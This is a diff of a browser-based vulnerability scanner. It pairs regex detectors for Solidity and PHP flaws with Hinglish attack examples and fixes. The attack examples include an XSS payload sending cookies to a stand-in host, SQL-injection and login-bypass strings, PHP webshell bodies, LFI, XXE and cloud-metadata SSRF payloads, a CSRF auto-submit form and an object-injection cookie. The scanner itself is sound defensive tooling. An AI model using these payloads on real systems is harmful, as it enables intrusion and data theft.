+ atk:["selfdestruct(payable(attacker)) → contract ka code+storage gone, ETH attacker ko.",
+      "Force-ETH variant: koi bhi selfdestruct se tumhare contract me ETH push kar sakta hai (accounting break)."],
+ def:["// selfdestruct hatao — ya at least onlyOwner + timelock + multi-sig confirmations",
+      "// ETH balance assumptions: address(this).balance pe hi kaam karo, credited tracking se diff handle"]},
+
+{id:"DOS-JAILER", nm:"DoS Jailer", dom:"CHAIN", sev:"MEDIUM",
+ d:"Unbounded loop + external call — gas limit cross → function forever revert (funds frozen).",
+ pats:[{re:/for\s*\([^)]*\.(?:length|balance)\b[^)]*\)\s*\{[\s\S]{0,250}?(?:\.transfer|\.send|\.call|external)/gi, lb:"loop + external call"}],
+ atk:["participants array 5000+ entries → payout loop out-of-gas → NOBODY withdraw kar sakta.",
+      "Attacker ne 10k dust addresses push kare → contract permanently jailed (DoS)."],
+ def:["// pull-payments: har user apna withdrawal khud kare (loop nahi)",
+      "// loop cap: require(users.length <= 500); batch processing (start,end params)"]},
+
+{id:"FRONTRUN-EAGLE", nm:"Frontrun Eagle", dom:"CHAIN", sev:"MEDIUM",
+ d:"MEV-sensitive ops (swap/set/claim) mempool me visible — bot frontrun karke value nikaal lega.",
+ pats:[
+  {re:/function\s+(?:swap|claim|set(?:Price|Fee)|fulfill|reveal)\w*\s*\(/gi, lb:"MEV-sensitive fn"},
+  {re:/(?:gasprice|gasPrice)\s*[:=]\s*tx\.gasprice|block\.basefee/gi, lb:"gas-price dependent logic"}],
+ atk:["NFT reveal tx pending → bot same tx higher gas pe copy → mint pehle, rare items khud ke.",
+      "Swap setPrice tx frontrun → arbitrage bot value extract (sandwich attack)."],
+ def:["// commit-reveal: keccak hash submit → next block reveal",
+      "// deadline param + slippage cap: swap(deadline: block.timestamp+60, minOut: ...)",
+      "// Flashbots Protect / private mempool (public chain me bhi private submission)"]},
+
+{id:"TIMESTAMP-CROOK", nm:"Timestamp Crook", dom:"CHAIN", sev:"LOW",
+ d:"block.timestamp logic-critical — miner ±15s skew se manipulate karta hai.",
+ pats:[{re:/block\.timestamp\s*(?:[<>=!]|[+\-])|require\s*\(\s*block\.timestamp/gi, lb:"timestamp dependence"}],
+ atk:["Lottery: if (block.timestamp % 60 < 10) → miner apna block us 10s window me paste → win always.",
+      "Auction end-time ±15s shift → sniping manipulation."],
+ def:["// timestamp sirf durations/elapsed ke liye (approx) — randomness/lottery ke liye KABHI nahi",
+      "// critical windows: ±15s tolerance design me hi bake karo"]},
+
+{id:"RANDOM-CRACKER", nm:"Randomness Cracker", dom:"CHAIN", sev:"HIGH",
+ d:"On-chain 'random' (blockhash/difficulty) predictable — miner ya bot predict karke game jeet sakta hai.",
+ pats:[{re:/blockhash\s*\(|block\.difficulty|keccak256\s*\([^)]*(?:block\.|timestamp|now)/gi, lb:"weak on-chain randomness"}],
+ atk:["seed = keccak256(block.timestamp, msg.sender) — sab public mempool me → bot exact same compute karega.",
+      "Fomo3D clone $3M+ isi predictability se drain hua. Miners blockhash/skip karna chun sakte (1-block window)."],
+ def:["// Chainlink VRF: requestRandomWords() → fulfiell callback — verifiable on-chain randomness",
+      "// ya commit-reveal + blockhash of FUTURE block + multi-block consensus delay"]},
+
+{id:"SIG-REPLAYER", nm:"Signature Replayer", dom:"CHAIN", sev:"HIGH",
+ d:"ecrecover without nonce/chain-id/deadline — same signature replay across txs/chains.",
+ pats:[{re:/ecrecover\s*\(/gi, lb:"ecrecover — replay scan"}],
+ atk:["Permit-like claim sign karo → attacker SAME sig se claim() 100 baar call (nonce absent) → drain.",
+      "Cross-chain: Ethereum sig Ethereum-Classic pe replay (EIP-155 pehle ka)."],
+ def:["bytes32 h = keccak256(abi.encodePacked(msg.sender, amount, nonce, deadline, block.chainid));",
+      "require(!usedNonces[nonce], \"replay\"); usedNonces[nonce] = true;",
+      "// + EIP-712 typed-data hashing — domain separator chain me bind"]},
+
+{id:"ORACLE-LIAR", nm:"Oracle Liar", dom:"CHAIN", sev:"HIGH",
+ d:"Price direct pool-reserves/spot se — flash-loan single-block manipulate (spot price oracle).",
+ pats:[
+  {re:/(?:getReserves\s*\(|reserves\d?\s*\*|balanceOf\s*\(\s*address\s*\(\s*this\s*\)\s*\)\s*\*|price0Cumulative)/gi, lb:"spot/reserve-based price"},
+  {re:/(?:token0|token1)\s*\.\s*balanceOf[^;\n]{0,60}price/gi, lb:"pool balance ratio = price"}],
+ atk:["Flash loan: pool ke ek side me 100M DAI dump → reserves ratio 100× shift →",
+      "tumhara protocol collateral ko 100× overprice → borrow saara treasury → repay loan, profit rakh.",
+      "Har on-chain spot-price oracle isi se mara (bZx, Mango Markets $110M, Euler...)."],
+ def:["// TWAP oracle: Uniswap V3 observe() over 30-min window — flash loan single block me shift nahi kar sakta",
+      "// ya Chainlink PriceFeed (aggregated, deviation-bounded) + staleness check: updatedAt > 1hr → revert"]},
+
+{id:"LIQUID-DRAINER", nm:"Liquidity Drainer", dom:"CHAIN", sev:"HIGH",
+ d:"LP unlock/lock state check — unlocked ya soon-unlocking LP = instant rug path.",
+ pats:[
+  {re:/(?:unlockTime|unlockAt|lockEnd|lpUnlock)\s*[<>=]+\s*(?:block\.timestamp|now)/gi, lb:"LP unlock condition"},
+  {re:/function\s+(?:removeLiquidity|burnLP|withdrawLP)\s*\(/gi, lb:"LP removal fn"}],
+ atk:["unlockTime < block.timestamp hote hi: removeLiquidity → WETH out → token supply dump.",
+      "Agar lock contract missing hi → LP tokens owner wallet me = rug ANYTIME."],
+ def:["// LP lock/vesy: UNCX/Team.Finance lock, unlockTime >= launch+365d — immutable",
+      "// burn LP (0xdead transfer) — permanent liquidity = strongest signal",
+      "// tokenomics: max-tx + max-wallet + trading-start escrow"]},
+
+{id:"GUARD-GAP", nm:"Guard Gap Agent", dom:"CHAIN", sev:"HIGH",
+ d:"v2.4 GUARD GAP: ReentrancyGuard import/inherit hai, par vulnerable fn pe nonReentrant missing — guard ki value zero.",
+ gate:(s)=>/(?:ReentrancyGuard|nonReentrant)/i.test(s)?null:"ReentrancyGuard present hi nahi — REENTRANCY-VIPER dekh lega",
+ pats:[
+  {re:/function\s+(?:withdraw|claim|unstake|redeem|swap|deposit)\w*\s*\([^)]*\)\s*(?:public|external)\s*(?:payable\s*)?(?:returns\s*\([^)]*\))?\s*\{/gi, lb:"guarded-class fn — nonReentrant scan"}],
+ atk:["Base contract ReentrancyGuard inherit hai → AUDITORS ko laga sab protected.",
+      "par vulnerable fn me modifier list me nonReentrant NAHI → wahi fn reentrancy entry-point.",
+      "Ye 'false security blanket' hai — audit-report me bhi miss hota hai."],
+ def:["function withdraw(uint256 amt) external nonReentrant {  // ← modifier YAHA ADD",
+      "  // har external-call wali fn pe individually — ek bhi miss = gap exploited",
+      "  // ya state-variable pattern use karo: reentrancyLock bool explicit"]},
+
+{id:"CEI-VIOLATOR", nm:"CEI Violator", dom:"CHAIN", sev:"MEDIUM",
+ d:"Checks-Effects-Interactions order broken: state write external call ke BAAD — reentrancy ka root cause.",
+ pats:[{re:/\.(?:transfer|send|call)\s*[\({][\s\S]{0,180}?(?:balances|deposits|shares|stakes|claimed|amounts|userInfo)[\w\[\].]*\s*(?:=|\+=|-=)/gi, lb:"call → baad me state write"}],
+ atk:["Effects-after-Interactions = reentrancy ka exact recipe — har re-entry pe state abhi bhi purana.",
+      "combined with fallback hook (ERC-777 / receive()) → silent drain loop."],
+ def:["// PATTERN:",
+      "1. CHECKS:    require(bal >= amt);",
+      "2. EFFECTS:   bal -= amt;  (state pehle)",
+      "3. INTERACT:  (bool ok,) = msg.sender.call{value:amt}(\"\"); require(ok);"]},
+
+{id:"BACKDOOR-RAT", nm:"Backdoor Rat", dom:"CHAIN", sev:"CRITICAL",
+ d:"Hidden backdoors: emergency/sweep/dev withdraw, hidden setters, kill-switch — deployer ka secret drain path.",
+ pats:[
+  {re:/function\s+\w*(?:sweep|drain|dev(?:Withdraw)?|emergency|kill|suicide|hidden|panic)\w*\s*\(/gi, lb:"backdoor-named fn"},
+  {re:/(?:devWallet|treasury|marketingWallet|feeWallet)\s*=\s*[\w]+\.(?:call|transfer|send)/gi, lb:"wallet reroute sink"},
+  {re:/only(?:Dev|Team|Deployer|God|Master)\b/gi, lb:"hidden-role modifier"}],
+ atk:["emergencyWithdraw() sirf owner: contract ka SAARA balance ek tx me — normal users ke liye 'safe' dikhta tha.",
+      "hidden setter: changeOwner(z) / devSetFee() — verified source me bhi mix me chhupa.",
+      "ALWAYS: proxy/upgrade path + owner-change history dekho."],
+ def:["// koi 'emergency' fn ho to: bounded (max X%), timelock, multisig, event — sab public",
+      "// verified source read karo END TAK + proxy admin + upgrade history",
+      "// automated: Backdoor scanner tools (ye agent) deploy pe always run karo"]},
+
+{id:"STORAGE-SPY", nm:"Storage Spy", dom:"CHAIN", sev:"MEDIUM",
+ d:"Uninitialized storage pointer / storage-collision — delegatecall proxy me data corruption.",
+ pats:[{re:/\b(?:struct|mapping)\s+[\w]+[^;]{0,60}?\s+\w+\s*;[\s\S]{0,50}?=|\bstorage\s+\w+\s*(?:=|;) */gi, lb:"storage pointer pattern"}],
+ atk:["Struct s; (memory nahi) → storage pointer slot-0 → write se owner variable overwrite!",
+      "Proxy upgrade me new variable append na karo → collision → admin slot corrupted → hijack."],
+ def:["Struct memory s = Struct(...);  // memory explicit",
+      "// proxy: EIP-1967 slots + append-only storage layout (gap arrays) + layout checker CI me"]},
+
+{id:"APPROVE-RACE", nm:"Approve Race Agent", dom:"CHAIN", sev:"HIGH",
+ d:"approve() race condition — spender ko approve change ke beech double-spend window.",
+ pats:[{re:/function\s+approve\s*\(|\.approve\s*\(\s*(?:spender|_spender)/gi, lb:"approve() classic API"}],
+ atk:["Tum approve(B, 100) bheje → B ne 100 spend kare + tum approve(B, 50) tx pending →",
+      "B frontrun kare apne spend ko → B ke paas 100+50=150 allowance → 50 double-spend."],
+ def:["// increaseAllowance/decreaseAllowance use karo (OZ ERC20 built-in):",
+      "increaseAllowance(spender, 50);   // atomic add — race window band",
+      "// spender side: permit (EIP-2612) + allowance exact-consume pattern"]},
+];
+
+/* ============ PHP DOMAIN — 14 agents ============ */
+const AGENTS_PHP = [
+{id:"PHP-SQLI", nm:"PHP SQLi Hunter", dom:"PHP", sev:"CRITICAL",
+ d:"mysqli_query / ->query() me $_GET/$_POST direct concat — classic #1 PHP vulnerability.",
+ pats:[
+  {re:/(?:mysqli_query|->query)\s*\([^;]*\.\s*\$_(?:GET|POST|REQUEST|COOKIE)/gi, lb:"query + superglobal concat"},
+  {re:/["'][^"']*(?:SELECT|INSERT|UPDATE|DELETE)[^"']*["']\s*\.\s*\$/gi, lb:"SQL literal . $var"},
+  {re:/(?:SELECT|INSERT|UPDATE|DELETE)[^;\n]{0,80}\.\s*\$_(?:GET|POST|REQUEST)/gi, lb:"inline SQL + input"}],
+ atk:["?id=1 UNION SELECT credit_card,cvv FROM payments-- -",
+      "Login bypass: user=' or 1=1-- -&pass=xyz → admin row match",
+      "Time-based: id=1 AND (SELECT SLEEP(5)) — data char-by-char extract (sqlmap auto)."],
+ def:["$stmt = $conn->prepare('SELECT * FROM users WHERE id = ?');",
+      "$stmt->bind_param('i', $_GET['id']);   // i=int, s=string — input protocol me bind",
+      "$stmt->execute();   // data query structure ka part NAHI banta — SQLi dead",
+      "// + PDO with prepared statements, Least-privilege DB user"]},
+
+{id:"PHP-XSS", nm:"PHP XSS Sniper", dom:"PHP", sev:"HIGH",
+ d:"echo/print $_GET/$_POST bina htmlspecialchars — session hijack, keylogger, deface.",
+ pats:[
+  {re:/echo\s+[^;\n]{0,40}\$_(?:GET|POST|REQUEST|SERVER\[['\"](PHP_SELF|HTTP_REFERER))/gi, lb:"echo + superglobal"},
+  {re:/print(?:_r)?\s*\(\s*\$_(?:GET|POST|REQUEST)/gi, lb:"print + superglobal"},
+  {re:/<\?=\s*\$_(?:GET|POST|REQUEST)/gi, lb:"<?= short echo + input"}],
+ atk:["profile.php?name=<svg onload='fetch(\"//evil.io/?\"+document.cookie)'>",
+      "Stored: guestbook me payload → har visitor ka session.",
+      "PHP_SELF injection: <form action='<?=$_SERVER[\"PHP_SELF\"]?>'> → /page.php/\"><script>..."],
+ def:["echo htmlspecialchars($name, ENT_QUOTES, 'UTF-8');   // < > & \" sab encode",
+      "// URL me: urlencode() | JS context me: json_encode()",
+      "// + Content-Security-Policy header — inline script block, damage bound"]},
+
+{id:"PHP-RCE", nm:"PHP RCE Detector", dom:"PHP", sev:"CRITICAL",
+ d:"eval/assert/system/exec/shell_exec/passthru me user input — instant full server compromise.",
+ pats:[
+  {re:/(?:eval|assert)\s*\(\s*\$_(?:GET|POST|REQUEST)/gi, lb:"eval + superglobal"},
+  {re:/(?:system|exec|shell_exec|passthru|popen|proc_open)\s*\([^;\n]{0,60}\$_(?:GET|POST|REQUEST)/gi, lb:"command fn + input"},
+  {re:/(?:eval|assert)\s*\(\s*\$/gi, lb:"eval($variable)"}],
+ atk:["?cmd=; cat /etc/passwd   (system(\"ping \".$_GET['cmd']) me)",
+      "eval($_POST['x']) → POST x=system('whoami'); → webshell (China Chopper style)",
+      "preg_replace /e modifier (legacy) code execution — PHP<7"],
+ def:["// eval/dynamic-exec user data pe KABHI — architecture hi badlo (config array, strategy pattern)",
+      "// command chalana hi hai: escapeshellarg($input) + exec('ping '.escapeshellarg($host), $out)",
+      "// better: execFile-equivalent — proc_open with argument array + disable_functions hardening"]},
+
+{id:"PHP-LFI", nm:"PHP LFI Crawler", dom:"PHP", sev:"HIGH",
+ d:"include/require me $_GET — traversal se config/source/logs read + wrapper tricks.",
+ pats:[
+  {re:/(?:include|require)(?:_once)?\s*\(\s*\$_(?:GET|POST|REQUEST)/gi, lb:"include + superglobal"},
+  {re:/(?:include|require)(?:_once)?\s*\([^;]*\.\s*\$_(?:GET|POST|REQUEST)/gi, lb:"include concat input"}],
+ atk:["?page=../../../../etc/passwd",
+      "Wrappers: ?page=php://filter/convert.base64-encode/resource=config.php → source base64 me!",
+      "Log poisoning: ?page=/var/log/apache2/access.log + UA me <?php system($_GET[c]);?> → RCE."],
+ def:["$allowed = ['home'=>'pages/home.php','about'=>'pages/about.php'];",
+      "$page = $allowed[$_GET['page']] ?? $allowed['home'];   // allowlist map — traversal impossible",
+      "// + open_basedir restriction php.ini me"]},
+
+{id:"PHP-UPLOAD", nm:"PHP Upload Breacher", dom:"PHP", sev:"CRITICAL",
+ d:"move_uploaded_file bina validation — shell.php upload → webshell → poora server.",
+ gate:(s)=>/(?:pathinfo|getimagesize|in_array\s*\(\s*\$|finfo|mime_content_type|allowed)/i.test(s)?null:"",
+ pats:[{re:/move_uploaded_file\s*\(/gi, lb:"upload sink — validation absent"}],
+ atk:["shell.php: <?php system($_GET['c']); ?> upload → /uploads/shell.php?c=wget+evil.sh",
+      "Bypass tricks: shell.phtml, shell.php5, .htaccess upload (AddType), Content-Type spoof,",
+      "image header + PHP body: GIF89a<?php system($_GET[c]); ?>"],
+ def:["$ext = strtolower(pathinfo($f['name'], PATHINFO_EXTENSION));",
+      "if (!in_array($ext, ['jpg','png','webp']) || !getimagesize($f['tmp_name'])) die('bad file');",
+      "$new = bin2hex(random_bytes(16)) . '.jpg';   // random naam, ext forced",
+      "move_uploaded_file($f['tmp_name'], '/var/uploads/'.$new);  // webroot BAHAR + serve via script"]},
+
+{id:"PHP-SESSION", nm:"PHP Session Hijacker", dom:"PHP", sev:"MEDIUM",
+ d:"session fixation (session_id user se) ya login pe regenerate missing — session takeover.",
+ pats:[
+  {re:/session_id\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)/gi, lb:"session_id user-controlled"},
+  {re:/session_start\s*\(/gi, lb:"session_start — regenerate scan"}],
+ atk:["Attacker victim ko link bheje: login.php?SID=ATTACKER_SET_SESSION_ID → victim login ke baad bhi",
+      "wohi SID active → attacker same SID se logged-in access (fixation)."],
+ def:["session_start();",
+      "if ($loginSuccess) { session_regenerate_id(true); $_SESSION['uid'] = $user->id; }",
+      "// php.ini: session.use_strict_mode=1, session.cookie_httponly=1, cookie_secure=1"]},
+
+{id:"PHP-CSRF", nm:"PHP CSRF Ghost", dom:"PHP", sev:"MEDIUM",
+ d:"POST handler me token verify nahi — attacker fake form se victim ke account pe action.",
+ gate:(s)=>/(?:csrf|_token|hash_equals\s*\(\s*\$_)/i.test(s)?null:"",
+ pats:[{re:/\$_SERVER\[['\"]REQUEST_METHOD['\"]\]\s*===?\s*['\"]POST['\"]|\$_POST\s*\[/gi, lb:"POST handler — token scan"}],
+ atk:["<form action='https://site.com/transfer' method='POST'><input name='to' value='evil'><input name='amt' value='99999'></form>",
+      "<script>document.forms[0].submit()<\/script> — victim ke cookies auto-attach → action legit lagta hai server ko."],
+ def:["$_SESSION['csrf'] ??= bin2hex(random_bytes(32));",
+      "form: <input type='hidden' name='csrf' value='<?= $_SESSION['csrf'] ?>'>",
+      "verify: if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) http_response_code(403);"]},
+
+{id:"PHP-CRYPTO", nm:"PHP Crypto Auditor", dom:"PHP", sev:"HIGH",
+ d:"md5/sha1 password hashing, rand() tokens — brute-force se instant crack.",
+ pats:[
+  {re:/(?:md5|sha1)\s*\(\s*\$_(?:POST|GET)/gi, lb:"password md5/sha1"},
+  {re:/(?:\$token|\$otp|\$code|\$sid)\s*=\s*(?:md5|sha1|rand)\s*\(/gi, lb:"token from md5/rand"},
+  {re:/rand\s*\(\s*\d+\s*,\s*\d+\s*\)/gi, lb:"rand() — predictable"}],
+ atk:["md5 password → GPU rig 100B hashes/sec → 8-char password minutes me (rainbow tables instant).",
+      "rand() token: Mersenne Twister — 624 outputs se state recover → future tokens predict.",
+      "$sid = rand(1000,9999) → 9000 possibilities → session brute-force seconds me."],
+ def:["password_verify($_POST['pw'], password_hash($_POST['pw'], PASSWORD_DEFAULT));  // bcrypt/argon2 auto-salt",
+      "// token: bin2hex(random_bytes(32)) — CSPRNG, predictable nahi",
+      "// rand()/mt_rand() security me KABHI nahi — sirf non-security purposes"]},
+
+{id:"PHP-HEADER-INJ", nm:"Header Injector", dom:"PHP", sev:"MEDIUM",
+ d:"header('Location: '.$_GET[...]) — header injection + open redirect (CRLF %0d%0a se response split).",
+ pats:[
+  {re:/header\s*\(\s*['\"]Location:[^'\"]*['\"]?\s*\.\s*\$_(?:GET|POST|REQUEST)/gi, lb:"Location + input"},
+  {re:/header\s*\(\s*['\"][^'\"]*['\"]\s*\.\s*\$_(?:GET|POST|REQUEST)/gi, lb:"header concat input"}],
+ atk:["?next=%0d%0aSet-Cookie:admin=1 → response splitting — attacker apne headers inject.",
+      "Phishing: login.php?next=https://evil-clone.com → trusted domain redirect abuse."],
+ def:["// allowlist redirect:",
+      "$next = in_array($_GET['next'] ?? '', $PAGES) ? $_GET['next'] : '/home';",
+      "header('Location: ' . $next, true, 302); exit;",
+      "// header values me user-data sanitize (strip CR/LF: str_replace([\"\\r\",\"\\n\"], '', $v))"]},
+
+{id:"PHP-XXE", nm:"PHP XXE Breaker", dom:"PHP", sev:"HIGH",
+ d:"XML parse external entities enabled — file read + SSRF (wrapper abuse).",
+ pats:[
+  {re:/libxml_disable_entity_loader\s*\(\s*false\s*\)/gi, lb:"entity loader enabled"},
+  {re:/(?:simplexml_load_string|DOMDocument\s*->\s*loadXML|XMLReader)\s*\(/gi, lb:"XML parser sink"},
+  {re:/LIBXML_NOENT|resolveEntities\s*=\s*true/gi, lb:"NOENT flag"}],
+ atk:["<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><r>&x;</r> → response me passwd",
+      "php://filter wrapper: <!ENTITY x SYSTEM 'php://filter/convert.base64-encode/resource=index.php'> → source leak",
+      "SSRF: <!ENTITY x SYSTEM 'http://169.254.169.254/latest/meta-data/'>"],
+ def:["libxml_disable_entity_loader(true);  // PHP <8.0 (8.0+ by-default safe)",
+      "$dom->loadXML($xml, LIBXML_NONET | LIBXML_NOENT === 0 ? 0 : 0); // NOENT use mat karo",
+      "// simplest: JSON accept karo — ya external entity resolve OFF verify karo test se"]},
+
+{id:"PHP-COOKIE", nm:"PHP Cookie Agent", dom:"PHP", sev:"LOW",
+ d:"setcookie me httponly/secure flags absent — XSS + MITM ke against cookie exposed.",
+ pats:[{re:/setcookie\s*\(\s*['\"]\w+['\"]\s*,[^)]*\)\s*;/gi, lb:"setcookie — flag scan"}],
+ atk:["XSS ho gayi to document.cookie readable → session theft (httponly absent).",
+      "HTTP connection pe cookie wire me plain → WiFi MITM capture (secure absent)."],
+ def:["setcookie('sid', $token, ['expires'=>time()+3600, 'path'=>'/', 'domain'=>'',",
+      "  'secure'=>true, 'httponly'=>true, 'samesite'=>'Strict']);",
+      "// array-syntax (PHP 7.3+) — sab flags ek jagah"]},
+
+{id:"PHP-EXPOSE", nm:"PHP Expose Detector", dom:"PHP", sev:"LOW",
+ d:"phpinfo() / debug output prod me — server paths, versions, env vars, extensions sab public.",
+ pats:[{re:/phpinfo\s*\(\s*\)|ini_set\s*\(\s*['\"]display_errors['\"]\s*,\s*['\"]?1|display_errors\s*=\s*On/gi, lb:"debug/expose sink"}],
+ atk:["phpinfo() page → SESSION save path, DB creds (env), document_root, loaded extensions + versions —",
+      "attacker in CVEs ko directly exploit match karta hai. Recon = 50% battle."],
+ def:["// production: display_errors=Off, log_errors=On (log sirf server pe)",
+      "// phpinfo() dev-only: if (getenv('APP_ENV') === 'dev') phpinfo();",
+      "// error pages generic rakho — framework debug bar (Laravel/Whoops) prod me OFF"]},
+
+{id:"PHP-DESERIAL", nm:"PHP Deserial Bomb", dom:"PHP", sev:"CRITICAL",
+ d:"unserialize() pe user-input — POP gadget chains se file-write/RCE tak (PHP object injection).",
+ pats:[
+  {re:/unserialize\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)/gi, lb:"unserialize + superglobal"},
+  {re:/unserialize\s*\(\s*(?:base64_decode|urldecode|stripslashes)\s*\(\s*\$/gi, lb:"unserialize + decoded input"}],
+ atk:["Cookie: O:7:\"FileMan\":2:{s:4:\"path\";s:11:\"/var/www/sh\";s:8:\"content\";s:24:\"<?php system($_GET[c]); ?>\"}",
+      "__destruct()/__wakeup() me file ops ho to object-crafting se webshell likh do.",
+      "Known gadgets: Laravel/Guzzle/Symfony POP chains — phpggc tool ready-made chains deta hai."],
+ def:["// user-data pe unserialize KABHI — json_decode() use karo",
+      "// legacy zaroorat: unserialize($d, ['allowed_classes' => false]) — objects instantiate nahi honge",
+      "// cookies/sessions apne format me sign karo (HMAC) — tampering se pehle hi reject"]},
+
+{id:"PHP-SSRF", nm:"PHP SSRF Probe", dom:"PHP", sev:"HIGH",
+ d:"file_get_contents/curl user URL pe — internal scan + cloud metadata + wrapper abuse.",
+ pats:[
+  {re:/(?:file_get_contents|fopen|readfile)\s*\(\s*\$_(?:GET|POST|REQUEST)/gi, lb:"file fn + input URL"},
+  {re:/(?:curl_init|curl_setopt\s*\([^;]*CURLOPT_URL[^;]*)\s*\)\s*;?\s*[\s\S]{0,60}\$_(?:GET|POST)|CURLOPT_URL\s*,\s*\$_(?:GET|POST|REQUEST)/gi, lb:"curl URL + input"}],
+ atk:["?fetch=http://169.254.169.254/latest/meta-data/iam/... → AWS keys",
+      "?fetch=file:///etc/passwd (allow_url_fopen) | ?fetch=http://localhost:6379 → internal",
+      "phar:// wrapper — deserialization gadget trigger bhi."],
+ def:["// scheme+host allowlist:",
+      "$p = parse_url($url); if (($p['scheme'] ?? '') !== 'https' || !in_array($p['host'], $ALLOWED)) die('bad url');",
+      "// + resolved-IP private-range block + redirects follow OFF (CURLOPT_FOLLOWLOCATION=false)"]},
+];
+
+const ALL_AGENTS = [...AGENTS_WEB, ...AGENTS_CHAIN, ...AGENTS_PHP];
+const DOM_BY_LANG = { SOLIDITY: "CHAIN", PHP: "PHP", WEB: "WEB" };
+const SEV_W = { CRITICAL: 28, HIGH: 16, MEDIUM: 8, LOW: 3, INFO: 0 };
+
+/* ============ ENGINE ============ */
+const $ = id => document.getElementById(id);
+let LANG = null, FINDINGS = [], RUNNING = false, CUR_FILTER = "ALL";
+
+function esc(s){ return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;"); }
+
+function detectLang(src){
+  if (/pragma\s+solidity|contract\s+\w+\s*(?:is|{)|\bfunction\s+\w+\s*\([^)]*\)\s*(?:public|external|internal)\s*(?:payable)?\s*{|msg\.sender|require\s*\(/.test(src) && !/<\?php/.test(src)) return "SOLIDITY";
+  if (/<\?php|\$\w+\s*=\s*\$_(?:GET|POST)|mysqli_|->query\s*\(|echo\s+\$/.test(src)) return "PHP";
+  if (/<(?:html|script|form|body)|document\.(?:write|getElementById|cookie)|fetch\s*\(|addEventListener|function\s+\w+\s*\(/.test(src)) return "WEB";
+  return "WEB";
+}
+
+function lineOf(src, idx){ let n = 1; for (let i=0;i<idx && i<src.length;i++) if (src[i]==="\n") n++; return n; }
+function snippetAt(src, idx, len){
+  const start = idx; const raw = src.slice(start, start+len);
+  return raw.replace(/\s+/g," ").trim().slice(0,140);
+}
+function isCommentLine(src, idx){
+  let i = idx-1, sol = true;
+  while (i>=0 && src[i]!=="\n"){ if (src[i]!==" " && src[i]!=="\t") sol=false; i--; }
+  if (!sol) return false;
+  let j=idx; while (j<src.length && (src[j]===" "||src[j]==="\t")) j++;
+  const s = src.slice(j, j+4);
+  return s.startsWith("//")||s.startsWith("/*")||s.startsWith("*")||s.startsWith("#")||s.startsWith("<!--");
+}
+
+function runAgent(agent, src){
+  if (agent.gate){
+    const skip = agent.gate(src);
+    if (skip && !agent.always) return { hits: [], skip: skip };
+    if (skip && agent.always) agent.__note = skip;
+  }
+  const hits = [];
+  for (const p of (agent.pats||[])){
+    const re = new RegExp(p.re.source, p.re.flags.includes("g") ? p.re.flags : p.re.flags + "g");
+    let m;
+    while ((m = re.exec(src)) !== null){
+      if (m[0].length === 0){ re.lastIndex++; continue; }
+      if (isCommentLine(src, m.index)) continue;
+      if (agent.skipIf && agent.skipIf(m[0], src, m.index)) continue;
+      if (hits.some(h => h.line === lineOf(src, m.index))) continue;
+      hits.push({ line: lineOf(src, m.index), snip: snippetAt(src, m.index, m[0].length + 40), lb: p.lb });
+      if (agent.once ? hits.length >= 1 : hits.length >= 4) break;
+    }
+  }
+  return { hits, skip: null };
+}
+
+/* ---- roster ---- */
+function renderRoster(){
+  $("agents").innerHTML = ALL_AGENTS.map((a,i)=>`
+    <div class="agent" id="ag${i}">
+      <span class="st"></span>
+      <div class="dom">${a.dom} · ${a.sev}</div>
+      <div class="nm">${esc(a.id)}</div>
+      <div class="rl">${esc(a.nm)}</div>
+      <div class="status" id="ags${i}">● IDLE</div>
+    </div>`).join("");
+  $("rosterCnt").textContent = `${ALL_AGENTS.length} agents loaded — ${AGENTS_WEB.length} WEB · ${AGENTS_CHAIN.length} CHAIN · ${AGENTS_PHP.length} PHP`;
+}
+
+/* ---- terminal ---- */
+function tlog(txt, cls){
+  const b = $("termBody");
+  const d = document.createElement("div");
+  d.className = "tl " + (cls||"mut");
+  d.textContent = txt;
+  b.appendChild(d);
+  b.scrollTop = b.scrollHeight;
+  while (b.children.length > 160) b.removeChild(b.firstChild);
+}
+
+/* ---- findings ---- */
+function addFinding(agent, hit){
+  const id = "f" + FINDINGS.length;
+  FINDINGS.push({ agent, hit });
+  const el = document.createElement("div");
+  el.className = "finding " + (agent.sev==="CRITICAL"?"":agent.sev.toLowerCase());
+  el.id = id;
+  el.dataset.sev = agent.sev;
+  el.innerHTML = `
+    <div class="f-hd" onclick="toggleCode('${id}')">
+      <span class="aid">${esc(agent.id)}</span>
+      <span class="sev ${agent.sev}">${agent.sev}</span>
+      <span class="ttl">${esc(agent.nm)}</span>
+      <span class="ln">📍 LINE ${hit.line} · ${esc(hit.lb||"")}</span>
+    </div>
+    <div class="f-desc">${esc(agent.d)}</div>
+    <div class="f-ev"><div class="cap">EVIDENCE — EXACT CODE (Rule #4)</div><pre>${esc(hit.snip)}</pre></div>
+    <div class="tabsx">
+      <button class="tab on-a" onclick="showCode('${id}','a')">🗡 ATTACK CODE</button>
+      <button class="tab" onclick="showCode('${id}','d')">🛡 DEFENCE CODE</button>
+    </div>
+    <div class="codebox atk show"><button class="copyb" onclick="cp(this)">COPY</button><pre>${esc(agent.atk.join("\n"))}</pre></div>
+    <div class="codebox def"><button class="copyb" onclick="cp(this)">COPY</button><pre>${esc(agent.def.join("\n"))}</pre></div>`;
+  $("findings").prepend(el);
+  updateStat();
+}
+function updateStat(){ $("stDet").textContent = FINDINGS.length; }
+function toggleCode(id){ const f=$(id); const ab=f.querySelector(".codebox.atk"); ab.classList.toggle("show"); }
+function showCode(id, w){
+  const f = $(id);
+  f.querySelector(".codebox.atk").classList.toggle("show", w==="a");
+  f.querySelector(".codebox.def").classList.toggle("show", w==="d");
+}
+function cp(b){
+  navigator.clipboard.writeText(b.parentElement.querySelector("pre").textContent).then(()=>{
+    b.textContent="✓ COPIED"; setTimeout(()=>b.textContent="COPY",1200);
+  });
+}
+
+/* ---- verdict ---- */
+function setRing(score, color){
+  const r = $("ring");
+  r.style.background = `conic-gradient(${color} calc(${score}*1%), #14201b 0)`;
+  $("scoreN").textContent = score;
+  $("scoreN").style.color = color;
+}
+function computeVerdict(){
+  const c = { CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0,INFO:0 };
+  FINDINGS.forEach(f => c[f.agent.sev]++);
+  let score = 100 - (c.CRITICAL*28 + c.HIGH*16 + c.MEDIUM*8 + c.LOW*3);
+  score = Math.max(0, Math.min(100, score));
+  let verdict, color, why;
+  if (score >= 85){ verdict = "✅ SAFE"; color = "var(--em)";
